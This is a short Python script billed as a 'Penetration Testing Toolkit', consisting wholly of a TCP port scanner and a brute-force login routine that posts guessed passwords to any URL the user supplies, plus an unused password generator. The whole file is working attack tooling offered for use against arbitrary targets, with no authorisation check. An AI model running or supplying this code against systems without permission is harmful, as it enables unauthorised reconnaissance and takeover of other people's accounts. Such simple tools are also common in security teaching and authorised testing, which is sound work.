import socket
import requests
import itertools
import threading

def port_scanner(target, ports):
    """Scan specified ports on a target host."""
    print(f"Scanning {target} for open ports...")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"[OPEN] Port {port} is open on {target}")
        s.close()

def brute_force_login(url, username, password_list):
    """Attempt brute-force login with a given username and password list."""
    print(f"Starting brute-force attack on {url} with username: {username}")
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if "incorrect password" not in response.text.lower():
            print(f"[SUCCESS] Password found: {password}")
            return
    print("Brute-force attack complete. No valid password found.")

def generate_passwords(charset, length):
    """Generate a list of possible passwords using a given character set and length."""
    return [''.join(p) for p in itertools.product(charset, repeat=length)]

def main():
    print("Penetration Testing Toolkit")
    print("1. Port Scanner")
    print("2. Brute Force Login")
    choice = input("Select a module (1/2): ")
    
    if choice == '1':
        target = input("Enter target IP or domain: ")
        ports = list(map(int, input("Enter ports to scan (comma-separated): ").split(',')))
        port_scanner(target, ports)
    elif choice == '2':
        url = input("Enter login URL: ")
        username = input("Enter username: ")
        password_list = input("Enter password list (comma-separated): ").split(',')
        brute_force_login(url, username, password_list)
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
